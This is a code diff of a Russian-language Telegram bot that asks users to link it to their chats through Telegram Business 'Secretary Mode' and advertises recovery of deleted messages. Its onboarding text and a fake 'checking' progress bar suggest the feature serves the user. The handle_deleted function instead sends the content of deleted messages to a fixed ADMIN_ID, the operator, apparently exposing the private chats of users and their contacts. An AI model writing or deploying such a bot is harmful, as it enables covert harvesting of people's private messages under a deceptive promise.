@@ -27,14 +27,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[InlineKeyboardButton("🔍 Проверить подключение", callback_data="check")]]
     text = f"""🔐 **Привет, {user.first_name}!**
 
-📌 **Чтобы активировать бота (нужен Telegram Premium):**
+📌 **Чтобы попробовать активировать бота:**
 
 1️⃣ Включи **Secretary Mode** в BotFather
 2️⃣ Подключи бота в **Настройки → Автоматизация чатов**
-3️⃣ **Напиши любое сообщение кому-нибудь** (другу, в группу)
-4️⃣ **Вернись сюда** и нажми кнопку ниже
+3️⃣ Напиши любое сообщение кому-нибудь
+4️⃣ Нажми кнопку ниже
 
-✅ После проверки бот активируется."""
+⚠️ Для работы нужен Telegram Premium."""
     
     await update.message.reply_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
 
@@ -43,54 +43,36 @@ async def check_connection(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     user_id = query.from_user.id
     
-    msg = await query.edit_message_text("🔄 Проверка подключения...")
+    msg = await query.edit_message_text("🔄 Проверка...")
     
-    # Анимация 10 квадратиков
+    # Анимация квадратиков
     for i in range(1, 11):
         percent = i * 10
         squares = "🟩" * i + "⬜" * (10 - i)
-        await msg.edit_text(f"📡 Проверка: {percent}%\n{squares}")
+        await msg.edit_text(f"📡 {percent}%\n{squares}")
         await asyncio.sleep(0.2)
     
-    # Проверяем, получал ли бот сообщения от этого пользователя
     c.execute('SELECT is_connected FROM users WHERE user_id=?', (user_id,))
     row = c.fetchone()
     
     if row and row[0] == 1:
-        await msg.edit_text(
-            "✅ **Бот активирован!**\n\n"
-            "Теперь я буду сохранять все сообщения из твоих чатов.\n\n"
-            "⚠️ Удалённые сообщения будут приходить сюда, если у тебя есть Telegram Premium.",
-            parse_mode="Markdown"
-        )
+        await msg.edit_text("✅ **Бот активирован!**\n\nЕсли есть Premium — удаления будут приходить.", parse_mode="Markdown")
     else:
         await msg.edit_text(
-            "❌ **Бот не обнаружен в чатах!**\n\n"
-            "📌 Проверь:\n"
-            "1️⃣ Telegram Premium активен?\n"
-            "2️⃣ Бот добавлен в Настройки → Автоматизация чатов?\n"
-            "3️⃣ Ты написал кому-нибудь сообщение ПОСЛЕ добавления?\n\n"
-            "🔄 После выполнения условий нажми кнопку снова",
-            parse_mode="Markdown",
+            "❌ **Бот не обнаружен**\n\n"
+            "Нужен Telegram Premium.\n"
+            "Если Premium есть: добавь бота в Автоматизация чатов и напиши кому-нибудь.\n\n"
+            "🔄 Нажми снова",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Проверить снова", callback_data="check")]])
         )
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Если бот получил сообщение из чата — значит, подключение работает"""
-    if update.message and update.message.from_user:
-        user_id = update.message.from_user.id
-        
-        # Игнорируем команду /start
-        if update.message.text and not update.message.text.startswith('/start'):
+    if update.message and update.message.from_user and update.message.text:
+        if not update.message.text.startswith('/start'):
+            user_id = update.message.from_user.id
             c.execute('INSERT OR REPLACE INTO users VALUES (?,?)', (user_id, 1))
             conn.commit()
-            logging.info(f"✅ Пользователь {user_id} подключён (получено сообщение: {update.message.text[:30]})")
-            
-            # Уведомляем пользователя, если ещё не уведомляли
-            await context.bot.send_message(
-                chat_id=user_id,
-                text="✅ **Бот обнаружен в чатах!**\n\nТеперь нажми «Проверить подключение» для активации."
-            )
+            await context.bot.send_message(chat_id=user_id, text="✅ Сообщение получено! Нажми «Проверить подключение».")
 
 async def handle_deleted(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if hasattr(update, 'deleted_business_messages') and update.deleted_business_messages:
@@ -99,7 +81,6 @@ async def handle_deleted(update: Update, context: ContextTypes.DEFAULT_TYPE):
             row = c.fetchone()
             if row and ADMIN_ID:
                 await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ Удалено: {row[0]}")
-                logging.info(f"Удаление: {d.message_id}")
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
